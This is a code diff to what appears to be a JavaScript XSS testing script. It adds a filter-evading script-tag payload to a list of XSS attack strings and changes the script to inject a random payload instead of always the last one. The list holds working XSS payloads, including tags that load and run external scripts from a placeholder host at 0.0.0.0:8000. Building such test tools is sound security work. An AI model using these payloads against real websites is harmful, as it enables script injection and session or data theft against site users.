@@ -30,7 +30,7 @@ var XSSattack = function(message){
 			}
 		}
 		called = true;
-		$('button').trigger('click');
+		$('button').triggerHandler('click');
 	}
 };
 
@@ -45,11 +45,12 @@ var attackVariants = [
   '<BODY ONLOAD=alert("You are vulnerable to an On-Load XSS attack")>',
   '<SCRIPT SRC=http://0.0.0.0:8000/non-alpha-xss.jpg></SCRIPT>',
   'data:text/html,<script>alert("You are vulnerable to a Data Injection XSS attack")</script>',
-  '<a href=“?xss=<script>”>You are vulnerable to Click-Jacking XSS attacks</a> '
+  '<a href=“?xss=<script>”>You are vulnerable to Click-Jacking XSS attacks</a>',
+  '<SCRIPT a=">"SRC="http://0.0.0.0:8000/non-alpha-xss.js"></SCRIPT>'
 
 ];
-XSSattack(attackVariants[attackVariants.length-1]);
-// XSSattack(attackVariants[Math.floor(Math.random() * attackVariants.length)]);
+// XSSattack(attackVariants[attackVariants.length-1]);
+XSSattack(attackVariants[Math.floor(Math.random() * attackVariants.length)]);
 
 
 
